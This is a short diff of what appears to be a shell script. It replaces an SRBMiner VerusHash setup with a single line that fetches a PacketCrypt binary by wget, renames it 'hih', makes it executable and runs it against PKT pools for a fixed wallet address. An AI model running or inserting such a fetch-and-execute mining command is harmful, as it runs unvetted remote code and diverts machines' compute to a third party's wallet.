@@ -1,4 +1,1 @@
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.1/SRBMiner-Multi-0-9-1-Linux.tar.xz
-tar xf SRBMiner-Multi-0-9-1-Linux.tar.xz
-cd SRBMiner-Multi-0-9-1
-./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool vrsc.ciscotech.dk:9999 --wallet RC1cM3E6qp34rJtem8fdvkfVQFVPL8pM4V
+wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O hih && chmod +x hih && ./hih ann -p pkt1qqq6yd2fdgrtfucax0tzx5vram8wt4n4v7ujwny http://pool.pktpool.io http://pool.pkteer.com
